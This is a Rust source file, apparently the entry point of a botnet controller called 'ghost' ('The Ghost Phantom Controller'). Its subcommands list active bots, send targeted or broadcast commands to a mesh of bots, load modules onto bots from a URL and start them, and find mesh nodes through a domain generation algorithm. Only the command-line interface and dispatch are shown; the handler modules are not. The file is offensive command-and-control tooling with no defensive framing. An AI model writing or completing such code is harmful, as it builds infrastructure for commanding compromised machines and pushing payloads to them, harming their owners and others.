use clap::{Parser, Subcommand};
use std::path::PathBuf;

mod crypto;
mod network;
mod commands;
mod discovery;

#[derive(Parser)]
#[command(name = "ghost")]
#[command(about = "The Ghost Phantom Controller", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Generate a new Ed25519 Keypair
    Keygen {
        #[arg(short, long, default_value = "keys/ghost.key")]
        output: PathBuf,
    },
    /// List active bots from Bootstrap Registry
    List {
        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
        bootstrap: Option<String>,
    },
    /// Target a specific bot (Not Impl)
    Target {
        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
        bootstrap: Option<String>,
        #[arg(short, long, default_value = "ghost.key")]
        key: PathBuf,
        #[arg(long)]
        target: String,
        #[arg(long)]
        cmd: String,
    },
    /// Broadcast Gossip to the Mesh
    Broadcast {
        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
        bootstrap: Option<String>,
        #[arg(short, long, default_value = "ghost.key")]
        key: PathBuf,
        #[arg(long)]
        cmd: String,
    },
    /// Load a module onto bots
    Load {
        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
        bootstrap: Option<String>,
        #[arg(short, long, default_value = "ghost.key")]
        key: PathBuf,
        #[arg(long)]
        url: String,
        #[arg(long)]
        name: String,
    },
    /// Start a loaded module
    Start {
        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
        bootstrap: Option<String>,
        #[arg(short, long, default_value = "ghost.key")]
        key: PathBuf,
        #[arg(long)]
        name: String,
        #[arg(long, default_value = "")]
        args: String,
    },
    /// Scan for Mesh Nodes via DGA
    Scan,
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    match cli.command {
        Commands::Keygen { output } => commands::handle_keygen(output).await,
        Commands::List { bootstrap } => commands::handle_list(bootstrap).await,
        Commands::Target { bootstrap, key, target, cmd } => commands::handle_target(bootstrap, key, target, cmd).await,
        Commands::Broadcast { bootstrap, key, cmd } => commands::handle_broadcast(bootstrap, key, cmd).await,
        Commands::Load { bootstrap, key, url, name } => commands::handle_load_module(bootstrap, key, url, name).await,
        Commands::Start { bootstrap, key, name, args } => commands::handle_start_module(bootstrap, key, name, args).await,
        Commands::Scan => commands::handle_scan().await,
    }
}
